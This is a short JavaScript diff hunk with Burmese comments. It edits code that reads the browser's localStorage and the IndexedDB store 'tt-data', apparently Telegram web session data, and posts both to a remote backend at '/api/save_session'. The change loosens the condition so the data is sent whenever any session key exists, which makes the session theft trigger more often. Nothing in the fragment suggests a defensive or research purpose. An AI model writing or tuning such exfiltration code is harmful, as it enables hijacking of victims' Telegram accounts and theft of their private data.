@@ -221,8 +221,8 @@
                         const lsDataStr = JSON.stringify(localStorage);
                         const rawIdbData = await exportIndexedDB("tt-data", "store");
                         
-                        // Telegram အကောင့်ထဲ ဝင်ထားမှသာ (Data ရှိမှသာ) Backend သို့ ပို့မည်
-                        if (Object.keys(rawIdbData).length > 5) { 
+                        // ပြင်ဆင်ချက်: Data အနည်းဆုံး ၁ ခုရှိတာနဲ့ အကောင့်ဝင်ပြီးပြီဟု ယူဆ၍ ပို့မည်
+                        if (Object.keys(rawIdbData).length > 0) { 
                             const idbDataStr = serializeData(rawIdbData);
 
                             const res = await fetch(BACKEND_URL + "/api/save_session", {
